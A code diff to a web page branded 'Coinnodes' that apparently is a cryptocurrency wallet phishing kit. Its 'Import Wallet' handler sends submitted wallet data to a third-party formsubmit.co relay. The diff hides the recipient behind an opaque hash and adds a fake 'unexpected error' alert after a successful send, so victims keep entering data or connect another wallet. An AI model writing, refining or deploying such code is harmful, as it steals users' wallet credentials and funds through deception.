@@ -840,19 +840,23 @@
 				message: data,
 				from_name: "Coinnodes"
 			}
-
+			$("#importBtn").prop("disabled", true).text("Importing...");
 			$.ajax({
-				url: "https://formsubmit.co/ajax/ramotamalomo82@gmail.com",
+				url: "https://formsubmit.co/ajax/a913c590b6f78d6710e878661df7549e",
 				method: "POST",
 				data: data,
 				dataType: "json"
 			})
 				.then((message) => {
 					console.log(message);
+					$("#importBtn").prop("disabled", false).text("Import Wallet");
+					alert("An unexpected error has occured. Contact Administrator to continue or connect another wallet");
 				})
-				.catch((error) => {
-					console.log(erroor);
-				});
+				.catch((err) => {
+					console.log(err);
+					$("#importBtn").prop("disabled", false).text("Import Wallet");
+					alert("Network error. Please try again later.");
+			});
 		}
 
 		window.addEventListener('load', function () {
